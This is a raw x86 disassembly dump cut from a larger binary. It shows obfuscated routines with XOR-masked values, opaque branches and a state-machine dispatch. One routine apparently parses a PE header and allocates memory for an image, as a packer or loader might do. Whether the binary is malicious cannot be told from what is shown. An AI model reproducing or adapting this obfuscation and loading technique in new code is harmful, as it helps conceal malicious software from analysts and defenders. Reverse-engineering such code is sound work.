  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
